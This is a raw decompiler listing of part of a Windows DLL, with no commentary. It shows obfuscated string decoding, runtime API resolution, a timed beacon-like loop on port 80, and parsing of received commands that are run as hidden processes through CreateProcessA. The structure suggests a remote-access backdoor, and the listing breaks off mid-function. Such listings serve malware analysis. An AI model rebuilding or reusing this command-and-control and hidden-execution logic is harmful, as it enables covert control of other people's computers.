  dword_10015680 = sub_10008918((int)&unk_100136B0);
  dword_10015684 = sub_10008918((int)&unk_10013688);
  dword_10015688 = sub_10008918((int)&unk_10013660);
  dword_1001568C = sub_10008918((int)&unk_10013638);
  dword_10015690 = sub_10008918((int)&unk_10013614);
  result = sub_10008918((int)&unk_100135F0);
  dword_10015694 = result;
  return result;
}
// 10015680: using guessed type int dword_10015680;
// 10015684: using guessed type int dword_10015684;
// 10015688: using guessed type int dword_10015688;
// 1001568C: using guessed type int dword_1001568C;
// 10015690: using guessed type int dword_10015690;
// 10015694: using guessed type int dword_10015694;

//----- (1000232C) --------------------------------------------------------
int sub_1000232C()
{
  int result; // eax

  result = sub_10008918((int)&unk_100136D8);
  dword_10015670 = result;
  return result;
}
// 10015670: using guessed type int dword_10015670;

//----- (10002342) --------------------------------------------------------
int sub_10002342()
{
  int result; // eax

  result = sub_10008918((int)&unk_100136F8);
  dword_10015628 = result;
  return result;
}
// 10015628: using guessed type int dword_10015628;

//----- (10002358) --------------------------------------------------------
int sub_10002358()
{
  int result; // eax

  result = sub_10008918((int)&unk_10013718);
  dword_10015678 = result;
  return result;
}
// 10015678: using guessed type int dword_10015678;

//----- (1000236E) --------------------------------------------------------
int sub_1000236E()
{
  int result; // eax

  result = sub_10008918((int)&unk_10013738);
  dword_10015634 = result;
  return result;
}
// 10015634: using guessed type int dword_10015634;

//----- (10002384) --------------------------------------------------------
char *sub_10002384()
{
  char *result; // eax

  result = (char *)sub_10008918((int)&unk_10013758);
  Str = result;
  return result;
}

//----- (1000239A) --------------------------------------------------------
char *sub_1000239A()
{
  char *result; // eax

  result = (char *)sub_10008918((int)&unk_10013778);
  dword_1001562C = result;
  return result;
}

//----- (100023B0) --------------------------------------------------------
char *sub_100023B0()
{
  char *result; // eax

  result = (char *)sub_10008918((int)&unk_10013798);
  dword_10015668 = result;
  return result;
}

//----- (100023C6) --------------------------------------------------------
char *sub_100023C6()
{
  char *result; // eax

  result = (char *)sub_10008918((int)&unk_100137B8);
  dword_1001563C = result;
  return result;
}

//----- (100023DC) --------------------------------------------------------
char *sub_100023DC()
{
  char *result; // eax

  result = (char *)sub_10008918((int)&unk_100137D8);
  dword_10015640 = result;
  return result;
}

//----- (100023F2) --------------------------------------------------------
char *sub_100023F2()
{
  char *result; // eax

  result = (char *)sub_10008918((int)&unk_100137F4);
  dword_10015630 = result;
  return result;
}

//----- (10002408) --------------------------------------------------------
char *sub_10002408()
{
  char *result; // eax

  result = (char *)sub_10008918((int)&unk_10013814);
  dword_10015620 = result;
  return result;
}

//----- (1000241E) --------------------------------------------------------
char *sub_1000241E()
{
  char *result; // eax

  result = (char *)sub_10008918((int)&unk_10013834);
  dword_10015648 = result;
  return result;
}

//----- (10002434) --------------------------------------------------------
const CHAR *sub_10002434()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_10013850);
  lpString = result;
  return result;
}

//----- (1000244A) --------------------------------------------------------
const CHAR *sub_1000244A()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_1001386C);
  lpString2 = result;
  return result;
}

//----- (10002460) --------------------------------------------------------
int sub_10002460()
{
  int result; // eax

  result = dword_1001567C;
  dword_10015674 = dword_1001567C;
  return result;
}
// 10015674: using guessed type int dword_10015674;
// 1001567C: using guessed type int dword_1001567C;

//----- (1000246B) --------------------------------------------------------
int __thiscall sub_1000246B(int this, int a2, int a3, int a4, int a5)
{
  unsigned int TickCount; // eax
  _DWORD *v7; // eax
  int v8; // ecx

  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = a2;
  *(_DWORD *)(this + 12) = a3;
  *(_DWORD *)(this + 68) = a5;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 808) = a4;
  *(_DWORD *)(this + 20) = 0;
  *(_DWORD *)(this + 24) = 0;
  *(_DWORD *)(this + 28) = 0;
  *(_DWORD *)(this + 32) = 0;
  *(_DWORD *)(this + 36) = 0;
  *(_DWORD *)(this + 40) = 0;
  *(_DWORD *)(this + 44) = 0;
  *(_DWORD *)(this + 48) = 0;
  *(_DWORD *)(this + 52) = 0;
  *(_DWORD *)(this + 56) = 0;
  *(_DWORD *)(this + 60) = 0;
  *(_DWORD *)(this + 64) = 0;
  *(_DWORD *)(this + 72) = 0;
  *(_WORD *)(this + 536) = 80;
  *(_DWORD *)(this + 796) = 0;
  *(_DWORD *)(this + 800) = 0;
  *(_DWORD *)(this + 804) = 0;
  *(_DWORD *)(this + 812) = 0;
  *(_DWORD *)(this + 816) = 0;
  *(_DWORD *)(this + 820) = 0;
  *(_DWORD *)(this + 824) = 0;
  *(_DWORD *)(this + 916) = 0;
  *(_DWORD *)(this + 920) = 0;
  *(_DWORD *)(this + 924) = 0;
  *(_DWORD *)(this + 928) = 0;
  *(_DWORD *)this = &off_100102DC;
  memset((void *)(this + 280), 0, 0x100u);
  memset((void *)(this + 538), 0, 0x100u);
  TickCount = GetTickCount();
  srand(TickCount);
  sub_10002BF4((HMODULE *)this);
  sub_10002C2F((_DWORD *)this);
  v7 = (_DWORD *)(this + 104);
  v8 = 22;
  do
  {
    v7[181] = 0;
    *v7 = 1;
    v7[22] = 0;
    ++v7;
    --v8;
  }
  while ( v8 );
  *(_DWORD *)(this + 80) = 0;
  *(_DWORD *)(this + 76) = 7449;
  *(_DWORD *)(this + 92) = 0;
  *(_DWORD *)(this + 96) = 0;
  *(_DWORD *)(this + 100) = 7449;
  *(_DWORD *)(this + 84) = 0;
  *(_DWORD *)(this + 88) = 6;
  return this;
}
// 100102DC: using guessed type int (__thiscall *off_100102DC)(void *, char);

//----- (10002590) --------------------------------------------------------
void *__thiscall sub_10002590(void *this, char a2)
{
  sub_100025AC((int)this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (100025AC) --------------------------------------------------------
void __thiscall sub_100025AC(int this)
{
  _DWORD *v2; // edi
  int v3; // ebx

  *(_DWORD *)this = &off_100102DC;
  sub_10002C86(this);
  sub_10002BF4((HMODULE *)this);
  v2 = (_DWORD *)(this + 828);
  v3 = 22;
  do
  {
    if ( *v2 )
      (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)*v2 + 12))(*v2, 1);
    ++v2;
    --v3;
  }
  while ( v3 );
  operator delete(*(void **)(this + 16));
  operator delete(*(void **)(this + 20));
  operator delete(*(void **)(this + 24));
  operator delete(*(void **)(this + 28));
  operator delete(*(void **)(this + 32));
  operator delete(*(void **)(this + 36));
  operator delete(*(void **)(this + 40));
  operator delete(*(void **)(this + 44));
  operator delete(*(void **)(this + 48));
  operator delete(*(void **)(this + 52));
  operator delete(*(void **)(this + 56));
  operator delete(*(void **)(this + 60));
  operator delete(*(void **)(this + 64));
}
// 100102DC: using guessed type int (__thiscall *off_100102DC)(void *, char);

//----- (1000264E) --------------------------------------------------------
int __thiscall sub_1000264E(_DWORD *this)
{
  if ( this[18] != 1 )
  {
    if ( !this[2] || !sub_1000B688() || !sub_10002D03((int)this) || !sub_10002711(this) || !sub_100027CD(this) )
    {
      sub_10001EE5(420, 1, 10, 0);
      sub_10003CAF();
      return 0;
    }
    this[18] = 1;
  }
  return 1;
}

//----- (10002711) --------------------------------------------------------
char __thiscall sub_10002711(_DWORD *this)
{
  const CHAR *v2; // eax
  char *v3; // eax
  const CHAR *v4; // eax
  char *v5; // eax
  int v7; // [esp+0h] [ebp-34h] BYREF
  void *v8; // [esp+14h] [ebp-20h]
  char *v9; // [esp+18h] [ebp-1Ch]
  void *v10; // [esp+1Ch] [ebp-18h]
  char *v11; // [esp+20h] [ebp-14h]
  int *v12; // [esp+24h] [ebp-10h]
  int v13; // [esp+30h] [ebp-4h]

  v12 = &v7;
  v13 = 0;
  v10 = operator new(0x11Cu);
  LOBYTE(v13) = 1;
  if ( v10 )
  {
    v2 = (const CHAR *)sub_10008918((int)&unk_1001388C);
    v3 = sub_1000E4E0((char *)v10, v2, 0, (int)String2, 1);
  }
  else
  {
    v3 = 0;
  }
  v11 = v3;
  LOBYTE(v13) = 0;
  this[16] = v3;
  if ( !v3 )
    return 0;
  v8 = operator new(0x11Cu);
  LOBYTE(v13) = 2;
  if ( v8 )
  {
    v4 = (const CHAR *)sub_10008918((int)&unk_1001345C);
    v5 = sub_1000E4E0((char *)v8, v4, 0, (int)String2, 1);
  }
  else
  {
    v5 = 0;
  }
  v9 = v5;
  LOBYTE(v13) = 0;
  this[15] = v5;
  if ( !v5 )
    return 0;
  v13 = -1;
  return 1;
}

//----- (100027CD) --------------------------------------------------------
char __thiscall sub_100027CD(_DWORD *this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  _DWORD *v16; // eax
  _DWORD *v17; // eax
  _DWORD *v18; // eax
  _DWORD *v19; // eax
  _DWORD *v20; // eax
  _DWORD *v21; // eax
  _DWORD *v22; // eax
  _DWORD *v23; // eax
  _DWORD *v24; // eax
  _DWORD *v25; // eax
  _DWORD *v26; // eax
  _DWORD *v27; // eax
  _DWORD *v28; // eax
  _DWORD *v29; // eax
  _DWORD *v30; // eax
  _DWORD *v31; // eax
  _DWORD *v32; // eax
  _DWORD *v33; // eax
  _DWORD *v34; // eax
  _DWORD *v35; // eax
  _DWORD *v36; // eax
  _DWORD *v37; // eax
  _DWORD *v38; // eax
  _DWORD *v39; // eax
  _DWORD *v40; // eax
  _DWORD *v41; // eax
  _DWORD *v42; // eax
  _DWORD *v43; // eax
  int v44; // eax
  _DWORD *v45; // eax
  int v46; // eax
  _DWORD *v47; // eax
  _DWORD *v48; // esi
  int v49; // edi
  int v51; // [esp-8h] [ebp-28h]
  int v52; // [esp-8h] [ebp-28h]
  _DWORD *v53; // [esp+10h] [ebp-10h]
  _DWORD *v54; // [esp+10h] [ebp-10h]

  v2 = operator new(4u);
  if ( v2 )
    v3 = sub_10001027(v2);
  else
    v3 = 0;
  this[207] = v3;
  v4 = operator new(4u);
  if ( v4 )
    v5 = sub_10001027(v4);
  else
    v5 = 0;
  this[208] = v5;
  v6 = operator new(4u);
  if ( v6 )
    v7 = sub_10001027(v6);
  else
    v7 = 0;
  this[209] = v7;
  v8 = operator new(4u);
  if ( v8 )
    v9 = sub_10001027(v8);
  else
    v9 = 0;
  this[210] = v9;
  v10 = operator new(4u);
  if ( v10 )
    v11 = sub_10001027(v10);
  else
    v11 = 0;
  this[211] = v11;
  v12 = operator new(4u);
  if ( v12 )
    v13 = sub_10001027(v12);
  else
    v13 = 0;
  this[212] = v13;
  v14 = operator new(4u);
  if ( v14 )
    v15 = sub_10001027(v14);
  else
    v15 = 0;
  this[213] = v15;
  v16 = operator new(4u);
  if ( v16 )
    v17 = sub_10001027(v16);
  else
    v17 = 0;
  this[214] = v17;
  v18 = operator new(4u);
  if ( v18 )
    v19 = sub_10001027(v18);
  else
    v19 = 0;
  this[215] = v19;
  v20 = operator new(4u);
  if ( v20 )
    v21 = sub_10001027(v20);
  else
    v21 = 0;
  this[216] = v21;
  v22 = operator new(4u);
  if ( v22 )
    v23 = sub_10001027(v22);
  else
    v23 = 0;
  this[217] = v23;
  v24 = operator new(4u);
  if ( v24 )
    v25 = sub_10001027(v24);
  else
    v25 = 0;
  this[218] = v25;
  v26 = operator new(4u);
  if ( v26 )
    v27 = sub_10001027(v26);
  else
    v27 = 0;
  this[219] = v27;
  v28 = operator new(4u);
  if ( v28 )
    v29 = sub_10001027(v28);
  else
    v29 = 0;
  this[220] = v29;
  v30 = operator new(4u);
  if ( v30 )
    v31 = sub_10001027(v30);
  else
    v31 = 0;
  this[221] = v31;
  v32 = operator new(4u);
  if ( v32 )
    v33 = sub_10001027(v32);
  else
    v33 = 0;
  this[222] = v33;
  v34 = operator new(4u);
  if ( v34 )
    v35 = sub_10001027(v34);
  else
    v35 = 0;
  this[222] = v35;
  v36 = operator new(4u);
  if ( v36 )
    v37 = sub_10001027(v36);
  else
    v37 = 0;
  this[224] = v37;
  v38 = operator new(4u);
  if ( v38 )
    v39 = sub_10001027(v38);
  else
    v39 = 0;
  this[225] = v39;
  v40 = operator new(4u);
  if ( v40 )
    v41 = sub_10001027(v40);
  else
    v41 = 0;
  this[223] = v41;
  v42 = operator new(4u);
  if ( v42 )
    v43 = sub_10001027(v42);
  else
    v43 = 0;
  this[226] = v43;
  v53 = operator new(0x18u);
  if ( v53 )
  {
    v51 = this[16];
    v44 = sub_10008918((int)&unk_100138E0);
    v45 = sub_100076B2(v53, (int)this, v44, 7449, v51, 0);
  }
  else
  {
    v45 = 0;
  }
  this[228] = v45;
  v54 = operator new(0x18u);
  if ( v54 )
  {
    v52 = this[15];
    v46 = sub_10008918((int)&unk_100138C4);
    v47 = sub_100076B2(v54, (int)this, v46, 7449, v52, 0);
  }
  else
  {
    v47 = 0;
  }
  this[227] = v47;
  v48 = this + 207;
  v49 = 0;
  while ( *v48 )
  {
    *(v48 - 181) = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v48 + 4))(*v48);
    ++v49;
    ++v48;
    if ( v49 >= 22 )
      return 1;
  }
  return 0;
}

//----- (10002BF4) --------------------------------------------------------
HMODULE __thiscall sub_10002BF4(HMODULE *this)
{
  _DWORD *v2; // esi
  HMODULE result; // eax

  v2 = this + 231;
  if ( this[231] )
  {
    FreeLibrary(this[231]);
    *v2 = 0;
  }
  result = this[232];
  if ( result )
  {
    result = (HMODULE)FreeLibrary(this[232]);
    this[232] = 0;
  }
  return result;
}

//----- (10002C2F) --------------------------------------------------------
int __thiscall sub_10002C2F(_DWORD *this)
{
  int result; // eax

  result = 0;
  this[233] = 0;
  this[234] = 0;
  dword_10015740 = 0;
  this[235] = 0;
  this[236] = 0;
  this[237] = 0;
  this[238] = 0;
  return result;
}
// 10015740: using guessed type int dword_10015740;

//----- (10002C5B) --------------------------------------------------------
void __thiscall sub_10002C5B(int *this)
{
  int v2; // ebx
  int v3; // eax

  this[1] = 0;
  this[203] = 0;
  v2 = *this;
  v3 = dword_10015740(80);
  (*(void (__thiscall **)(int *, _DWORD, int))(v2 + 16))(this, 0, v3);
  sub_10002C86((int)this);
}
// 10015740: invalid function type has been ignored
// 10015740: using guessed type int (__stdcall *dword_10015740)(_DWORD);

//----- (10002C86) --------------------------------------------------------
void __thiscall sub_10002C86(int this)
{
  _DWORD *v2; // edi

  v2 = (_DWORD *)(this + 796);
  if ( *(_DWORD *)(this + 796) )
  {
    sub_10008DAB(*(void **)(this + 796));
    *v2 = 0;
  }
  if ( *(_DWORD *)(this + 800) )
  {
    free(*(void **)(this + 800));
    *(_DWORD *)(this + 800) = 0;
    *(_DWORD *)(this + 804) = 0;
  }
  if ( *(_DWORD *)(this + 816) )
  {
    sub_10008DAB(*(void **)(this + 816));
    *(_DWORD *)(this + 816) = 0;
  }
  if ( *(_DWORD *)(this + 820) )
  {
    free(*(void **)(this + 820));
    *(_DWORD *)(this + 820) = 0;
    *(_DWORD *)(this + 824) = 0;
  }
}

//----- (10002D03) --------------------------------------------------------
int __thiscall sub_10002D03(int this)
{
  HMODULE LibraryA; // eax
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  FARPROC ProcAddress; // eax
  bool v6; // zf
  HMODULE v7; // eax
  const CHAR *v8; // eax
  const CHAR *v9; // eax
  const CHAR *v10; // eax
  const CHAR *v11; // eax
  const CHAR *v12; // eax
  FARPROC v13; // eax
  int v15; // [esp+10h] [ebp-4h]

  v15 = 0;
  LibraryA = LoadLibraryA(lpLibFileName);
  *(_DWORD *)(this + 924) = LibraryA;
  if ( !LibraryA )
    goto LABEL_11;
  v3 = (const CHAR *)sub_10008918((int)&unk_100139CC);
  *(_DWORD *)(this + 932) = GetProcAddress(*(HMODULE *)(this + 924), v3);
  v4 = (const CHAR *)sub_10008918((int)&unk_100139A4);
  ProcAddress = GetProcAddress(*(HMODULE *)(this + 924), v4);
  v6 = *(_DWORD *)(this + 932) == 0;
  *(_DWORD *)(this + 936) = ProcAddress;
  if ( v6 )
    goto LABEL_11;
  if ( !ProcAddress )
    goto LABEL_11;
  v7 = LoadLibraryA(dword_10015660);
  *(_DWORD *)(this + 928) = v7;
  if ( !v7 )
    goto LABEL_11;
  v8 = (const CHAR *)sub_10008918((int)&unk_10013984);
  dword_10015740 = (int)GetProcAddress(*(HMODULE *)(this + 928), v8);
  v9 = (const CHAR *)sub_10008918((int)&unk_10013964);
  *(_DWORD *)(this + 940) = GetProcAddress(*(HMODULE *)(this + 928), v9);
  v10 = (const CHAR *)sub_10008918((int)&unk_10013944);
  *(_DWORD *)(this + 944) = GetProcAddress(*(HMODULE *)(this + 928), v10);
  v11 = (const CHAR *)sub_10008918((int)&unk_10013920);
  *(_DWORD *)(this + 948) = GetProcAddress(*(HMODULE *)(this + 928), v11);
  v12 = (const CHAR *)sub_10008918((int)&unk_100138FC);
  v13 = GetProcAddress(*(HMODULE *)(this + 928), v12);
  *(_DWORD *)(this + 952) = v13;
  if ( !dword_10015740 )
    goto LABEL_11;
  if ( *(_DWORD *)(this + 940) && *(_DWORD *)(this + 944) && *(_DWORD *)(this + 948) && v13 )
    return 1;
LABEL_11:
  sub_10002BF4((HMODULE *)this);
  sub_10002C2F((_DWORD *)this);
  return v15;
}
// 10015740: using guessed type int dword_10015740;

//----- (10002E57) --------------------------------------------------------
void __fastcall sub_10002E57(int *a1)
{
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  unsigned int v4; // edi
  int v5; // eax
  unsigned int v6; // edx
  unsigned int v7; // esi
  int i; // eax
  unsigned int *v9; // edi
  unsigned int v10; // ecx
  int v11; // esi
  int v12; // eax
  _DWORD v13[55]; // [esp-CCh] [ebp-12Ch] BYREF
  int v14; // [esp+10h] [ebp-50h]
  int v15; // [esp+14h] [ebp-4Ch]
  bool v16; // [esp+18h] [ebp-48h]
  void *TickCount; // [esp+1Ch] [ebp-44h]
  unsigned int v18; // [esp+20h] [ebp-40h]
  HANDLE v19; // [esp+24h] [ebp-3Ch]
  HANDLE v20[2]; // [esp+28h] [ebp-38h] BYREF
  unsigned int v21; // [esp+30h] [ebp-30h]
  unsigned int v22; // [esp+34h] [ebp-2Ch]
  unsigned int v23; // [esp+38h] [ebp-28h]
  HANDLE hObject; // [esp+3Ch] [ebp-24h] BYREF
  unsigned int v25; // [esp+40h] [ebp-20h]
  DWORD v26; // [esp+44h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+48h] [ebp-18h]

  v13[54] = a1;
  v25 = 0;
  v18 = 0;
  v21 = 0;
  v22 = 0;
  if ( a1[18] )
  {
    hObject = 0;
    v19 = 0;
    v20[0] = 0;
    ms_exc.registration.TryLevel = 0;
    if ( a1[17] )
    {
      v2 = (const CHAR *)sub_10008918((int)&unk_100131D0);
      if ( sub_1000B6D3(v2, v20) )
      {
        v3 = (const CHAR *)sub_10008918((int)&unk_1001337C);
        if ( sub_1000B6D3(v3, &hObject) )
        {
          TickCount = (void *)GetTickCount();
          sub_10004DA4(a1 + 19);
          v16 = (unsigned int)a1[23] < 0x3C;
          sub_1000C9BB(byte_10015730, 13);
          sub_10001EE5(420, 5, 56, 0);
          while ( 1 )
          {
            while ( 1 )
            {
              v26 = WaitForSingleObject((HANDLE)a1[17], 0x3E8u);
              if ( v26 != 258 )
                goto LABEL_29;
              sub_10002C5B(a1);
              v13[50] = v22 == 0;
              if ( !sub_10004E74() )
              {
                sub_10001EE5(420, 1, 2, 0);
                sub_10003CAF();
                goto LABEL_29;
              }
              ++v22;
              v22 %= 0x1Eu;
              v4 = (unsigned int)TickCount;
              v20[1] = TickCount;
              TickCount = (void *)GetTickCount();
              v5 = sub_10004D7D((unsigned int)TickCount, v4);
              v25 += v5;
              v6 = v25 % 0x3E8;
              v7 = v25 / 0x3E8;
              v23 = v7;
              v25 %= 0x3E8u;
              v18 += v7;
              if ( v18 >= 0x12C )
              {
                qmemcpy(v13, a1 + 19, 0xCCu);
                sub_10004E27(v13[0]);
                v18 = 0;
                v7 = v23;
              }
              if ( v16 )
                break;
LABEL_14:
              a1[20] += v7;
              a1[19] += v7;
              a1[24] += v7;
              v21 += v7;
              for ( i = 0; ; ++i )
              {
                v15 = i;
                if ( i >= 22 )
                  break;
                v9 = (unsigned int *)&a1[i + 48];
                *v9 += v7;
                v6 = *v9;
                v10 = a1[i + 26];
                if ( v10 != 1 && v10 <= v6 )
                {
                  (**(void (__thiscall ***)(int))a1[i + 207])(a1[i + 207]);
                  *v9 = 0;
                  i = v15;
                }
              }
              if ( v21 >= 0x3E8 )
              {
                (*(void (__fastcall **)(int, unsigned int))(*(_DWORD *)a1[2] + 8))(a1[2], v6);
                v21 = 0;
              }
              if ( (unsigned int)a1[20] >= 0x4F1A00 )
              {
                (*(void (__fastcall **)(int *, unsigned int))(*a1 + 32))(a1, v6);
                goto LABEL_29;
              }
              if ( a1[25] <= (unsigned int)a1[19] )
              {
                a1[19] = 0;
                if ( (*(unsigned __int8 (__fastcall **)(int, unsigned int, int))(*(_DWORD *)a1[2] + 20))(
                       a1[2],
                       v6,
                       a1[17]) )
                {
                  v14 = 4;
                  if ( (unsigned __int8)sub_10005155((_DWORD **)a1) == 1 )
                  {
                    v11 = *a1;
                    v12 = dword_10015740(80);
                    (*(void (__thiscall **)(int *, _DWORD, int))(v11 + 16))(a1, 0, v12);
                    v14 = (*(int (__thiscall **)(int *))(*a1 + 4))(a1);
                  }
                  (*(void (__thiscall **)(int))(*(_DWORD *)a1[2] + 24))(a1[2]);
                  if ( !v14 )
                    goto LABEL_29;
                }
              }
            }
            a1[23] += v7;
            if ( (unsigned int)a1[23] >= 0x3C )
            {
              v16 = 0;
              goto LABEL_14;
            }
          }
        }
      }
    }
LABEL_29:
    ms_exc.registration.TryLevel = 2;
    if ( hObject )
      CloseHandle(hObject);
    if ( v19 )
      CloseHandle(v19);
    if ( v20[0] )
      CloseHandle(v20[0]);
  }
}
// 10003059: variable 'v6' is possibly undefined
// 10015740: using guessed type int (__stdcall *dword_10015740)(_DWORD);

//----- (10003169) --------------------------------------------------------
int sub_10003169()
{
  sub_10001EE5(420, 1, 11, 0);
  return sub_10003CAF();
}

//----- (100031A7) --------------------------------------------------------
int __thiscall sub_100031A7(int *this)
{
  int v2; // ebp
  int v3; // ebx
  BOOL v4; // edi

  v2 = 4;
  v3 = 0;
  v4 = 0;
  sub_10008959();
  do
  {
    if ( v3 >= 1 )
      break;
    v4 = sub_10003373(this);
    ++v3;
  }
  while ( !v4 );
  if ( v4 )
  {
    if ( this[199] )
    {
      v2 = sub_100033B9((void **)this);
      if ( this[1] == 1 )
        this[24] = 0;
    }
  }
  sub_10004711((int)this);
  return v2;
}

//----- (100031FA) --------------------------------------------------------
int __thiscall sub_100031FA(void *this, unsigned int a2, int a3)
{
  if ( a2 == -1 )
    return (*(int (__thiscall **)(void *, int, int, char (*)[4]))(*(_DWORD *)this + 8))(
             this,
             dword_1001567C,
             a3,
             off_10013498);
  if ( a2 > 6 )
    return 0;
  return (*(int (__thiscall **)(void *, LPCSTR, int, _DWORD))(*(_DWORD *)this + 12))(
           this,
           (&dword_1001576C)[a2],
           a3,
           *(&dword_10015788 + a2));
}
// 10013498: using guessed type char (*off_10013498)[4];
// 1001567C: using guessed type int dword_1001567C;

//----- (10003248) --------------------------------------------------------
BOOL __thiscall sub_10003248(CHAR *this, const CHAR *a2, __int16 a3, LPCSTR lpString2)
{
  BOOL v5; // esi

  v5 = sub_100032A4((int)this, a2, a3) != 0;
  if ( !sub_100032E3(this, lpString2) )
    return 0;
  return v5;
}

//----- (1000327A) --------------------------------------------------------
int __thiscall sub_1000327A(int (__stdcall **this)(_DWORD), int a2, int a3, int a4)
{
  int v5; // eax
  int (__stdcall *v6)(_DWORD); // edi
  int v7; // eax

  v5 = this[236](a2);
  v6 = *this;
  v7 = ((int (__stdcall *)(int, int, int))this[237])(v5, a3, a4);
  return (*((int (__thiscall **)(int (__stdcall **)(_DWORD), int))v6 + 3))(this, v7);
}

//----- (100032A4) --------------------------------------------------------
LPSTR __thiscall sub_100032A4(int this, const CHAR *a2, __int16 a3)
{
  LPSTR result; // eax

  if ( a2 )
    result = lstrcpynA((LPSTR)(this + 280), a2, 256);
  else
    result = lstrcpynA((LPSTR)(this + 280), dword_1001576C, 256);
  if ( result )
  {
    *(_WORD *)(this + 536) = a3;
    return (LPSTR)1;
  }
  return result;
}

//----- (100032E3) --------------------------------------------------------
BOOL __thiscall sub_100032E3(CHAR *this, LPCSTR lpString2)
{
  return lstrcpynA(this + 538, lpString2, 256) != 0;
}

//----- (10003302) --------------------------------------------------------
int __thiscall sub_10003302(int this, _DWORD *a2, _WORD *a3)
{
  int v3; // eax
  int result; // eax

  v3 = this + 280;
  *a2 = this + 280;
  LOWORD(v3) = *(_WORD *)(this + 536);
  result = (*(int (__stdcall **)(int))(this + 940))(v3);
  *a3 = result;
  return result;
}

//----- (10003326) --------------------------------------------------------
BOOL __thiscall sub_10003326(int this)
{
  int v2[8]; // [esp+0h] [ebp-20h] BYREF

  v2[0] = (int)String2;
  v2[1] = (int)String2;
  v2[2] = (int)String2;
  v2[3] = dword_1001575C;
  ++*(_DWORD *)(this + 916);
  memset(&v2[5], 0, 12);
  v2[4] = (int)String1;
  return sub_1000377D((_DWORD **)this, v2, (void **)(this + 796), 1) == 0;
}
// 1001575C: using guessed type int dword_1001575C;

//----- (10003373) --------------------------------------------------------
BOOL __thiscall sub_10003373(int *this)
{
  int v1; // esi
  BOOL v3; // ebx
  int v4; // ebp
  int v5; // eax

  v1 = 0;
  v3 = 0;
  do
  {
    if ( v1 >= 7 )
      break;
    v4 = *this;
    v5 = dword_10015740(80);
    if ( (*(int (__thiscall **)(int *, int, int))(v4 + 16))(this, v1, v5) == 1 )
      v3 = sub_10003326((int)this);
    ++v1;
  }
  while ( !v3 );
  return v3;
}
// 10015740: using guessed type int (__stdcall *dword_10015740)(_DWORD);

//----- (100033B9) --------------------------------------------------------
int __thiscall sub_100033B9(void **this)
{
  const char *v2; // ebx
  char *v3; // eax
  unsigned int v4; // ebp
  char *i; // eax

  v2 = (const char *)sub_10008918((int)&unk_100139FC);
  v3 = (char *)this[199];
  v4 = 2;
  if ( !v3 )
    return 4;
  for ( i = strtok(v3, v2); i && v4 >= 2; i = strtok(0, v2) )
    v4 = sub_10003DD5((int)this, i);
  if ( this[199] )
  {
    sub_10008DAB(this[199]);
    this[199] = 0;
  }
  return v4;
}

//----- (10003425) --------------------------------------------------------
int __thiscall sub_10003425(void *this, int a2, const char **a3)
{
  bool v5; // zf
  const char *v6; // esi
  LPCSTR *v7; // esi
  int v8; // eax
  int v9; // eax
  bool v10; // sf
  const char *v11; // eax
  const char *v13; // [esp-4h] [ebp-600h]
  char Destination[1504]; // [esp+Ch] [ebp-5F0h] BYREF
  int v15; // [esp+5ECh] [ebp-10h]
  void *v16; // [esp+5F0h] [ebp-Ch]
  DWORD dwMilliseconds; // [esp+5F4h] [ebp-8h]
  DWORD dwCreationFlags; // [esp+5F8h] [ebp-4h]
  int i; // [esp+604h] [ebp+8h]
  const char **v20; // [esp+608h] [ebp+Ch]

  v16 = this;
  v15 = 0;
  dwCreationFlags = 0;
  dwMilliseconds = 10000;
  if ( a2 < 6 )
    return 20;
  v5 = a3[6] == 0;
  v20 = a3 + 6;
  if ( v5 )
    return 6;
  if ( strncmp(a3[3], Str2, 1u) && strncmp(a3[3], String1, 1u) )
    return 7;
  if ( !strncmp(a3[3], Str2, 1u) )
  {
    v13 = a3[4];
    v15 = 1;
    dwMilliseconds = atoi(v13);
  }
  v6 = a3[5];
  if ( v6 )
    dwCreationFlags = atoi(v6);
  v7 = v20;
  Destination[0] = 0;
  for ( i = 0; *v7; v20 = v7 )
  {
    v8 = lstrlenA(lpString);
    if ( !strncmp(*v20, lpString, v8) )
      break;
    v9 = lstrlenA(*v7);
    v10 = i + v9 - 1499 < 0;
    i += v9 + 1;
    if ( !(v10 ^ __OFSUB__(i, 1500) | (i == 1500)) )
      return 8;
    strncat(Destination, *v7, v9);
    v11 = (const char *)sub_10008918((int)&unk_10013A18);
    strncat(Destination, v11, 1u);
    ++v7;
  }
  if ( v15 == 1 )
    return sub_10003605(v16, Destination, dwCreationFlags, dwMilliseconds);
  else
    return sub_100036BC(Destination, dwCreationFlags);
}

//----- (1000358F) --------------------------------------------------------
int __stdcall sub_1000358F(LPSTR lpCommandLine, DWORD dwCreationFlags, DWORD *a3)
{
  struct _STARTUPINFOA StartupInfo; // [esp+4h] [ebp-54h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+48h] [ebp-10h] BYREF

  memset(&ProcessInformation, 0, sizeof(ProcessInformation));
  memset(&StartupInfo, 0, sizeof(StartupInfo));
  StartupInfo.cb = 68;
  StartupInfo.dwFlags = 1;
  StartupInfo.wShowWindow = 0;
  if ( !CreateProcessA(0, lpCommandLine, 0, 0, 0, dwCreationFlags, 0, 0, &StartupInfo, &ProcessInformation) )
    return -1;
  CloseHandle(ProcessInformation.hThread);
  if ( a3 )
    *a3 = ProcessInformation.dwProcessId;
  return (int)ProcessInformation.hProcess;
}

//----- (10003605) --------------------------------------------------------
int __thiscall sub_10003605(void *this, LPSTR lpCommandLine, DWORD ExitCode, DWORD dwMilliseconds)
{
  void *v5; // eax
  void *v6; // esi
  HANDLE v7; // eax
  int v8; // edi
  int v10; // [esp-4h] [ebp-10h]
  DWORD dwProcessId; // [esp+8h] [ebp-4h] BYREF

  dwProcessId = 0;
